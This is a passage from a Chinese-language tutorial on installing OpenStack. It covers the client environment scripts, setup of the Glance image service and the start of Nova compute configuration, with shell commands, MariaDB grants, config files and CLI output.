id="3-3-4-创建-OpenStack-客户端环境脚本"><a href="#3-3-4-创建-OpenStack-客户端环境脚本" class="headerlink" title="3.3.4**创建 OpenStack 客户端环境脚本**"></a><strong>3.3.4**</strong>创建 OpenStack 客户端环境脚本**</h3><p>vi admin-openrc 加入如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> OS_PROJECT_DOMAIN_NAME=Default</span><br><span class="line"><span class="keyword">export</span> OS_USER_DOMAIN_NAME=Default</span><br><span class="line"><span class="keyword">export</span> OS_PROJECT_NAME=admin</span><br><span class="line"><span class="keyword">export</span> OS_USERNAME=admin</span><br><span class="line"><span class="keyword">export</span> OS_PASSWORD=ADMIN_PASS</span><br><span class="line"><span class="keyword">export</span> OS_AUTH_URL=http:<span class="comment">//linux-node2:35357/v3</span></span><br><span class="line"><span class="keyword">export</span> OS_IDENTITY_API_VERSION=<span class="number">3</span></span><br><span class="line"><span class="keyword">export</span> OS_IMAGE_API_VERSION=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>#vi demo-openrc 加入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# cat demo-openrc </span><br><span class="line"><span class="keyword">export</span> OS_PROJECT_DOMAIN_NAME=Default</span><br><span class="line"><span class="keyword">export</span> OS_USER_DOMAIN_NAME=Default</span><br><span class="line"><span class="keyword">export</span> OS_PROJECT_NAME=demo</span><br><span class="line"><span class="keyword">export</span> OS_USERNAME=demo</span><br><span class="line"><span class="keyword">export</span> OS_PASSWORD=demo</span><br><span class="line"><span class="keyword">export</span> OS_AUTH_URL=http:<span class="comment">//linux-node2:5000/v3</span></span><br><span class="line"><span class="keyword">export</span> OS_IDENTITY_API_VERSION=<span class="number">3</span></span><br><span class="line"><span class="keyword">export</span> OS_IMAGE_API_VERSION=<span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="四-：镜像服务-Glance（node2-主控制节点操作）"><a href="#四-：镜像服务-Glance（node2-主控制节点操作）" class="headerlink" title="四**：镜像服务**Glance（node2 主控制节点操作）"></a><strong>四**</strong>：镜像服务<strong>**Glance（node2 主控制节点操作）</strong></h2><h3 id="4-1-Glance-介绍"><a href="#4-1-Glance-介绍" class="headerlink" title="4.1 Glance 介绍"></a><strong>4.1 Glance 介绍</strong></h3><p>Glance 主要由三个部分构成： glance-api、glance-registry 以 image stroe</p><p>   Glance-api：接受云系统镜像创建、删除、读取请求</p><p>   Glance-Registry： 云系统镜像注册服务</p><h3 id="4-2-mysql-配置"><a href="#4-2-mysql-配置" class="headerlink" title="4.2 mysql 配置"></a><strong>4.2 mysql 配置</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u root –p</span><br><span class="line">MariaDB [(none)]&gt; CREATE DATABASE glance;</span><br><span class="line">MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON glance.* TO <span class="string">'glance'</span>@<span class="string">'localhost'</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">'glance'</span>;</span><br><span class="line">MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON glance.* TO <span class="string">'glance'</span>@<span class="string">'%'</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">'glance'</span>;</span><br></pre></td></tr></table></figure><h3 id="4-3-Glance安装"><a href="#4-3-Glance安装" class="headerlink" title="4.3 Glance安装"></a><strong>4.3 Glance安装</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># yum install openstack-glance</span><br></pre></td></tr></table></figure><h3 id="4-4修改主配置文件-etc-glance-glance-api-conf"><a href="#4-4修改主配置文件-etc-glance-glance-api-conf" class="headerlink" title="4.4修改主配置文件**/etc/glance/glance-api.conf**"></a><strong>4.4修改主配置文件**</strong>/etc/glance/glance-api.conf**</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[database]</span><br><span class="line"># ...</span><br><span class="line">connection = mysql:<span class="comment">//glance:glance@192.168.57.145/glance</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在[keystone_authtoken]和[paste_deploy]部分中，配置身份服务访问：</span><br><span class="line">[keystone_authtoken] </span><br><span class="line">auth_uri  =  http:<span class="comment">//linux-node2:5000</span></span><br><span class="line">auth_url  =  http:<span class="comment">//linux-node2:35357</span></span><br><span class="line">memcached_servers  =  linux-node2:<span class="number">11211</span></span><br><span class="line">auth_type  =  password</span><br><span class="line">project_domain_name  =  <span class="keyword">default</span></span><br><span class="line">user_domain_name  =  <span class="keyword">default</span></span><br><span class="line">project_name  =  service</span><br><span class="line">username  =  glance</span><br><span class="line">password  =  glance    #########这里的密码就是下面的新建 API  glance用户的密码</span><br><span class="line">＃... </span><br><span class="line">[paste_deploy]</span><br><span class="line">flavor  =  keystone</span><br><span class="line">[glance_store]</span><br><span class="line"># ...</span><br><span class="line">stores = file,http</span><br><span class="line">default_store = file</span><br><span class="line">filesystem_store_datadir = <span class="regexp">/var/</span>lib/glance/images/</span><br></pre></td></tr></table></figure><h3 id="4-5-修改主配置文件-etc-glance-glance-registry-conf"><a href="#4-5-修改主配置文件-etc-glance-glance-registry-conf" class="headerlink" title="4.5 修改主配置文件**/etc/glance/glance-registry.conf**"></a><strong>4.5 修改主配置文件**</strong>/etc/glance/glance-registry.conf**</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[database]</span><br><span class="line"># ...</span><br><span class="line">connection = mysql:<span class="comment">//glance:glance@192.168.57.145/glance</span></span><br></pre></td></tr></table></figure><p>在[keystone_authtoken]和[paste_deploy]部分中，配置身份服务访问：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[keystone_authtoken] </span><br><span class="line">auth_uri  =  http:<span class="comment">//linux-node2:5000</span></span><br><span class="line">auth_url  =  http:<span class="comment">//linux-node2:35357</span></span><br><span class="line">memcached_servers  =  linux-node2:<span class="number">11211</span></span><br><span class="line">auth_type  =  password</span><br><span class="line">project_domain_name  =  <span class="keyword">default</span></span><br><span class="line">user_domain_name  =  <span class="keyword">default</span></span><br><span class="line">project_name  =  service</span><br><span class="line">username  =  glance</span><br><span class="line">password  =  glance  #########这里的密码就是下面的新建 API  glance用户的密码</span><br><span class="line">＃... </span><br><span class="line">[paste_deploy]</span><br><span class="line">flavor  =  keystone</span><br></pre></td></tr></table></figure><h3 id="4-6-设置数据库"><a href="#4-6-设置数据库" class="headerlink" title="4.6 设置数据库"></a><strong>4.6 设置数据库</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># su -s /bin/sh -c "glance-manage db_sync" glance</span><br></pre></td></tr></table></figure><h3 id="4-7创建镜像服务的API服务"><a href="#4-7创建镜像服务的API服务" class="headerlink" title="4.7创建镜像服务的API服务"></a><strong>4.7创建镜像服务的API服务</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ openstack user create --domain <span class="keyword">default</span> --password-prompt glance</span><br><span class="line">$ openstack role add --project service --user glance admin</span><br><span class="line">$ openstack service create --name glance \</span><br><span class="line">  --description <span class="string">"OpenStack Image"</span> image</span><br><span class="line">$ openstack endpoint create --region RegionOne \</span><br><span class="line">  image public http:<span class="comment">//linux-node2:9292</span></span><br><span class="line">$ openstack endpoint create --region RegionOne \</span><br><span class="line">  image internal http:<span class="comment">//linux-node2:9292</span></span><br><span class="line">$ openstack endpoint create --region RegionOne \</span><br><span class="line">  image admin http:<span class="comment">//linux-node2:9292</span></span><br></pre></td></tr></table></figure><h3 id="4-8-启动服务"><a href="#4-8-启动服务" class="headerlink" title="4.8 启动服务"></a><strong>4.8 启动服务</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># systemctl enable openstack-glance-api.service \</span><br><span class="line">  openstack-glance-registry.service</span><br><span class="line"># systemctl start openstack-glance-api.service \</span><br><span class="line">  openstack-glance-registry.service</span><br></pre></td></tr></table></figure><h3 id="4-9验证"><a href="#4-9验证" class="headerlink" title="4.9验证"></a><strong>4.9验证</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">运行环境变量：</span><br><span class="line">　　#. admin-openrc</span><br><span class="line">　　下载一个比较小的镜像：</span><br><span class="line">　　#wget http://download.cirros-cloud.net/0.3.5/cirros-0.3.5-x86_64-disk.img</span><br></pre></td></tr></table></figure><p>一、上传文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ openstack image create <span class="string">"cirros"</span> \</span><br><span class="line">  --file cirros<span class="number">-0.3</span><span class="number">.5</span>-x86_64-disk.img \</span><br><span class="line">  --disk-format qcow2 --container-format bare \</span><br><span class="line">  --public</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line">| Field            | Value                                                |</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line">| checksum         | <span class="number">133</span>eae9fb1c98f45894a4e60d8736619                     |</span><br><span class="line">| container_format | bare                                                 |</span><br><span class="line">| created_at       | <span class="number">2015</span><span class="number">-03</span><span class="number">-26</span>T16:<span class="number">52</span>:<span class="number">10</span>Z                                 |</span><br><span class="line">| disk_format      | qcow2                                                |</span><br><span class="line">| file             | <span class="regexp">/v2/im</span>ages/cc5c6982<span class="number">-4910</span><span class="number">-471</span>e-b864<span class="number">-1098015901</span>b5/file |</span><br><span class="line">| id               | cc5c6982<span class="number">-4910</span><span class="number">-471</span>e-b864<span class="number">-1098015901</span>b5                 |</span><br><span class="line">| min_disk         | <span class="number">0</span>                                                    |</span><br><span class="line">| min_ram          | <span class="number">0</span>                                                    |</span><br><span class="line">| name             | cirros                                               |</span><br><span class="line">| owner            | ae7a98326b9c455588edd2656d723b9d                     |</span><br><span class="line">| protected        | False                                                |</span><br><span class="line">| schema           | <span class="regexp">/v2/</span>schemas/image                                    |</span><br><span class="line">| size             | <span class="number">13200896</span>                                             |</span><br><span class="line">| status           | active                                               |</span><br><span class="line">| tags             |                                                      |</span><br><span class="line">| updated_at       | <span class="number">2015</span><span class="number">-03</span><span class="number">-26</span>T16:<span class="number">52</span>:<span class="number">10</span>Z                                 |</span><br><span class="line">| virtual_size     | None                                                 |</span><br><span class="line">| visibility       | public                                               |</span><br><span class="line">+------------------+------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>二、查看</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ openstack image list</span><br><span class="line"></span><br><span class="line">+--------------------------------------+--------+--------+</span><br><span class="line">| ID                                   | Name   | Status |</span><br><span class="line">+--------------------------------------+--------+--------+</span><br><span class="line">| <span class="number">38047887</span><span class="number">-61</span>a7<span class="number">-41</span>ea<span class="number">-9</span>b49<span class="number">-27987</span>d5e8bb9 | cirros | active |</span><br><span class="line">+--------------------------------------+--------+--------+</span><br></pre></td></tr></table></figure><p>有输出证明glance配置正确</p><h2 id="五、计算服务一-nova（node2控制节点操作）"><a href="#五、计算服务一-nova（node2控制节点操作）" class="headerlink" title="五、计算服务一 nova（node2控制节点操作）"></a><strong>五、计算服务一 nova（node2控制节点操作）</strong></h2><h3 id="5-N-ova-作用"><a href="#5-N-ova-作用" class="headerlink" title="5 .**N**ova 作用"></a><strong>5 .**</strong>N<strong>**ova 作用</strong></h3><p>\1. API :负责接收和相应外部请求、支持 openstack API Ec2API</p><p>\2. Cert：负责身份认证</p><p>\3. Scheduler：用于云主机调度</p><p>\4. Conductor： 计算节点访问数据的中间件</p><p>\5. Consoleaut：用于控制台的授权验证</p><p>\6. NovncProxy： VNC代理</p><h3 id="5-1-新建数据库"><a href="#5-1-新建数据库" class="headerlink" title="5.1 新建数据库"></a><strong>5.1 新建数据库</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u root –p</span><br><span class="line">MariaDB [(none)]&gt; CREATE DATABASE nova_api;</span><br><span class="line">MariaDB [(none)]&gt; CREATE DATABASE nova;</span><br><span class="line">MariaDB [(none)]&gt; CREATE DATABASE nova_cell0;</span><br><span class="line">新建用户</span><br><span class="line">MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON nova_api.* TO <span class="string">'nova'</span>@<span class="string">'%'</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">'nova'</span>;</span><br><span class="line">MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON nova.* TO <span class="string">'nova'</span>@<span class="string">'localhost'</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">'nova'</span>;</span><br><span class="line">MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON nova_cell0.* TO <span class="string">'nova'</span>@<span class="string">'%'</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">'nova'</span>;</span><br></pre></td></tr></table></figure><h3 id="5-2-创建nova用户："><a href="#5-2-创建nova用户：" class="headerlink" title="5.2**创建nova用户：**"></a><strong>5.2**</strong>创建nova用户：**</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># . admin-openrc</span><br><span class="line"></span><br><span class="line">openstack user create --domain <span class="keyword">default</span> --password-prompt nova</span><br><span class="line">User Password: nova</span><br><span class="line">Repeat User Password: nova</span><br><span class="line">The passwords entered were not the same</span><br><span class="line">User Password: nova</span><br><span class="line">Repeat User Password:  nova</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| Field               | Value                            |</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| domain_id           | <span class="keyword">default</span>                          |</span><br><span class="line">| enabled             | True                             |</span><br><span class="line">| id                  | b9878680c70a4a678fd9a7a580706ccf |</span><br><span class="line">| name                | nova                             |</span><br><span class="line">| options             | &#123;&#125;                               |</span><br><span class="line">| password_expires_at | None                             |</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">[root@linux-node2 ~]#</span><br></pre></td></tr></table></figure><p>加入组</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]#  openstack role add --project service --user nova admin</span><br></pre></td></tr></table></figure><h3 id="5-3创建nova服务实体"><a href="#5-3创建nova服务实体" class="headerlink" title="5.3创建nova服务实体"></a><strong>5.3创建nova服务实体</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ openstack service create --name nova \</span><br><span class="line">  --description <span class="string">"OpenStack Compute"</span> compute</span><br><span class="line"></span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| Field       | Value                            |</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| description | OpenStack Compute                |</span><br><span class="line">| enabled     | True                             |</span><br><span class="line">| id          | <span class="number">060</span>d59eac51b4594815603d75a00aba2 |</span><br><span class="line">| name        | nova                             |</span><br><span class="line">| type        | compute                          |</span><br><span class="line">+-------------+----------------------------------+</span><br></pre></td></tr></table></figure><h3 id="5-4创建服务API"><a href="#5-4创建服务API" class="headerlink" title="5.4创建服务API"></a><strong>5.4创建服务API</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# openstack endpoint create --region RegionOne \</span><br><span class="line">&gt;   compute public http:<span class="comment">//linux-node2:8774/v2.1</span></span><br><span class="line">+--------------+----------------------------------+</span><br><span class="line">| Field        | Value                            |</span><br><span class="line">+--------------+----------------------------------+</span><br><span class="line">| enabled      | True                             |</span><br><span class="line">| id           | b6ebf975780344a597a65650eafdf67a |</span><br><span class="line">| interface    | public                           |</span><br><span class="line">| region       | RegionOne                        |</span><br><span class="line">| region_id    | RegionOne                        |</span><br><span class="line">| service_id   | d6a1591a15944bea85ab1e203af6732c |</span><br><span class="line">| service_name | nova                             |</span><br><span class="line">| service_type | compute                          |</span><br><span class="line">| url          | http:<span class="comment">//linux-node2:8774/v2.1     |</span></span><br><span class="line">+--------------+----------------------------------+</span><br><span class="line">[root@linux-node2 ~]# openstack endpoint create --region RegionOne \</span><br><span class="line">&gt;   compute internal http:<span class="comment">//linux-node2:8774/v2.1</span></span><br><span class="line">+--------------+----------------------------------+</span><br><span class="line">| Field        | Value                            |</span><br><span class="line">+--------------+----------------------------------+</span><br><span class="line">| enabled      | True                             |</span><br><span class="line">| id           | a2c1af804a31484cb3d82017b15fa47f |</span><br><span class="line">| interface    | internal                         |</span><br><span class="line">| region       | RegionOne                        |</span><br><span class="line">| region_id    | RegionOne                        |</span><br><span class="line">| service_id   | d6a1591a15944bea85ab1e203af6732c |</span><br><span class="line">| service_name | nova                             |</span><br><span class="line">| service_type | compute                          |</span><br><span class="line">| url          | http:<span class="comment">//linux-node2:8774/v2.1     |</span></span><br><span class="line">+--------------+----------------------------------+</span><br><span class="line">[root@linux-node2 ~]# openstack endpoint create --region RegionOne \</span><br><span class="line">&gt;   compute admin http:<span class="comment">//linux-node2:8774/v2.1</span></span><br><span class="line">+--------------+----------------------------------+</span><br><span class="line">| Field        | Value                            |</span><br><span class="line">+--------------+----------------------------------+</span><br><span class="line">| enabled      | True                             |</span><br><span class="line">| id           | <span class="number">0304</span>b6e92bf049d09e7d28bacfb1ed16 |</span><br><span class="line">| interface    | admin                            |</span><br><span class="line">| region       | RegionOne                        |</span><br><span class="line">| region_id    | RegionOne                        |</span><br><span class="line">| service_id   | d6a1591a15944bea85ab1e203af6732c |</span><br><span class="line">| service_name | nova                             |</span><br><span class="line">| service_type | compute                          |</span><br><span class="line">| url          | http:<span class="comment">//linux-node2:8774/v2.1     |</span></span><br><span class="line">+--------------+----------------------------------+</span><br></pre></td></tr></table></figure><h3 id="5-5新建另一个用户"><a href="#5-5新建另一个用户" class="headerlink" title="5.5新建另一个用户"></a><strong>5.5新建另一个用户</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# openstack user create --domain default --password-prompt placement</span><br><span class="line">User Password: nova </span><br><span class="line">Repeat User Password: nova</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| Field               | Value                            |</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| domain_id           | <span class="keyword">default</span>                          |</span><br><span class="line">| enabled             | True                             |</span><br><span class="line">| id                  | <span class="number">1654</span>b6d199bf4fc582d1e70db802a31a |</span><br><span class="line">| name                | placement                        |</span><br><span class="line">| options             | &#123;&#125;                               |</span><br><span class="line">| password_expires_at | None                             |</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">[root@linux-node2 ~]#</span><br></pre></td></tr></table></figure><p>加入管理员组</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# openstack role add --project service --user placement admin</span><br></pre></td></tr></table></figure><h3 id="5-6-在服务目录中创建Placement-API条目："><a href="#5-6-在服务目录中创建Placement-API条目：" class="headerlink" title="5.6**在服务目录中创建Placement API条目：**"></a><strong>5.6**</strong>在服务目录中创建Placement API条目：**</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ openstack service create --name placement --description <span class="string">"Placement API"</span> placement</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| Field       | Value                            |</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| description | Placement API                    |</span><br><span class="line">| enabled     | True                             |</span><br><span class="line">| id          | <span class="number">2</span>d1a27022e6e4185b86adac4444c495f |</span><br><span class="line">| name        | placement                        |</span><br><span class="line">| type        | placement                        |</span><br><span class="line">+-------------+----------------------------------+</span><br></pre></td></tr></table></figure><h3 id="5-7-创建Placement-API服务端点："><a href="#5-7-创建Placement-API服务端点：" class="headerlink" title="5.7**创建Placement API服务端点：**"></a><strong>5.7**</strong>创建Placement API服务端点：**</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]#  openstack endpoint create --region RegionOne placement public http://linux-node2:8778</span><br><span class="line">+--------------+----------------------------------+</span><br><span class="line">| Field        | Value                            |</span><br><span class="line">+--------------+----------------------------------+</span><br><span class="line">| enabled      | True                             |</span><br><span class="line">| id           | <span class="number">4</span>b82fb4b30de4228982dea8c663f6d26 |</span><br><span class="line">| interface    | public                           |</span><br><span class="line">| region       | RegionOne                        |</span><br><span class="line">| region_id    | RegionOne                        |</span><br><span class="line">| service_id   | ba2a8b23524a4635af583cbfc80abd91 |</span><br><span class="line">| service_name | placement                        |</span><br><span class="line">| service_type | placement                        |</span><br><span class="line">| url          | http:<span class="comment">//linux-node2:8778          |</span></span><br><span class="line">+--------------+----------------------------------+</span><br><span class="line">[root@linux-node2 ~]# openstack endpoint create --region RegionOne placement internal http://linux-node2:8778</span><br><span class="line">+--------------+----------------------------------+</span><br><span class="line">| Field        | Value                            |</span><br><span class="line">+--------------+----------------------------------+</span><br><span class="line">| enabled      | True                             |</span><br><span class="line">| id           | bea3dbb6003d4cea802527de411f8cde |</span><br><span class="line">| interface    | internal                         |</span><br><span class="line">| region       | RegionOne                        |</span><br><span class="line">| region_id    | RegionOne                        |</span><br><span class="line">| service_id   | ba2a8b23524a4635af583cbfc80abd91 |</span><br><span class="line">| service_name | placement                        |</span><br><span class="line">| service_type | placement                        |</span><br><span class="line">| url          | http:<span class="comment">//linux-node2:8778          |</span></span><br><span class="line">+--------------+----------------------------------+</span><br><span class="line">[root@linux-node2 ~]# openstack endpoint create --region RegionOne placement admin http://linux-node2:8778</span><br><span class="line">+--------------+----------------------------------+</span><br><span class="line">| Field        | Value                            |</span><br><span class="line">+--------------+----------------------------------+</span><br><span class="line">| enabled      | True                             |</span><br><span class="line">| id           | b5d6d62d8f3f4e7c9ee2d6241b832bc5 |</span><br><span class="line">| interface    | admin                            |</span><br><span class="line">| region       | RegionOne                        |</span><br><span class="line">| region_id    | RegionOne                        |</span><br><span class="line">| service_id   | ba2a8b23524a4635af583cbfc80abd91 |</span><br><span class="line">| service_name | placement                        |</span><br><span class="line">| service_type | placement                        |</span><br><span class="line">| url          | http:<span class="comment">//linux-node2:8778          |</span></span><br><span class="line">+--------------+----------------------------------+</span><br></pre></td></tr></table></figure><h3 id="5-8-安装和配置的部件"><a href="#5-8-安装和配置的部件" class="headerlink" title="5.8**安装和配置的部件**"></a><strong>5.8**</strong>安装和配置的部件**</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># yum install openstack-nova-api openstack-nova-conductor \</span><br><span class="line">  openstack-nova-<span class="built_in">console</span> openstack-nova-novncproxy \</span><br><span class="line">  openstack-nova-scheduler openstack-nova-placement-api</span><br></pre></td></tr></table></figure><h3 id="5-9修改配置文件-etc-nova-nova-conf"><a href="#5-9修改配置文件-etc-nova-nova-conf" class="headerlink" title="5.9修改配置文件 /etc/nova/nova.conf"></a><strong>5.9修改配置文件</strong> <strong>/etc/nova/nova.conf</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line"># ...</span><br><span class="line">enabled_apis = osapi_compute,metadata</span><br><span class="line"> [api_database]</span><br><span class="line">connection=mysql:<span class="comment">//nova:nova@192.168.57.145/nova_api</span></span><br><span class="line">[database]</span><br><span class="line">connection=connection=mysql:<span 